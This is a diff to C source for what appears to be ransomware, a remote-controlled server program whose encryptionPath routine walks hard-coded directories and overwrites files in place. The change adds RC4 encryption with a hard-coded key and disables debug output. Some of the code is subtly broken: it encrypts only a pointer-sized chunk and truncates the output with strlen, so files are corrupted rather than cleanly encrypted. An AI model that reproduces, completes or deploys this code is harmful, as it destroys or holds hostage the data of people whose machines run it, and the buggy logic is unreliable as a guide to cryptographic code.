@@ -12,6 +12,10 @@
 #include <sys/types.h>
 #include <sys/dir.h>
 #include <sys/stat.h>
+#include <openssl/rc4.h>
+
+
+
 
 #define SVR_PORT 8899
 #define LISTEN_MAX 10
@@ -29,7 +33,7 @@
 #define COMMAND_SEPARATOR ','
 #define MAX_PATH_LENGTH 512
 #define ZERO(buff) memset(buff,0,MAX_PACKET)
-#define DEBUG 1
+#define DEBUG 0
 
 
 // 功能
@@ -52,7 +56,17 @@ void help(int clientSock);
 int encryptionPath(char * path);
 int encryption();
 int startServer();
+int rc4encryption(unsigned char * inData, unsigned char * outData, unsigned int dataLength);
 
+
+int rc4encryption(unsigned char * inData, unsigned char * outData, unsigned int dataLength){
+    memset(outData,0,dataLength);
+    RC4_KEY key;
+    unsigned char keyStr[8] = "Rvn0xsy";
+    RC4_set_key(&key, sizeof(keyStr),keyStr);
+    RC4(&key,dataLength,inData,outData);
+    return 0;
+}
 
 int encryption(){
     char paths[MAX_PATH_NUM][MAX_PATH_LENGTH]={
@@ -207,22 +221,14 @@ int encryptionPath(char * path){
                     fread(fileSize,1,encryptFileStat.st_size,fp);
                     fclose(fp);
                     char * pchar = fileSize;
-                    // 遍历
-                    while(*pchar){
-                        if((*pchar & 1) == 1){
-                            //奇数
-                            *pchar+=1;
-                        }else{
-                            // 偶数
-                            *pchar/=2;
-                        }
-                        pchar++;
-                    }
+                    char * outData = calloc(sizeof(fileSize), sizeof(unsigned char));
+                    rc4encryption((unsigned char*)fileSize,(unsigned char*)outData, sizeof(fileSize));
                     // 将内存写入文件
                     fp = fopen(absolutePath,"w");
-                    fwrite(fileSize,strlen(fileSize),1,fp);
+                    fwrite(outData,strlen(outData),1,fp);
                     fclose(fp);
                     free(fileSize);
+                    free(outData);
                 }
             }
             free(absolutePath);
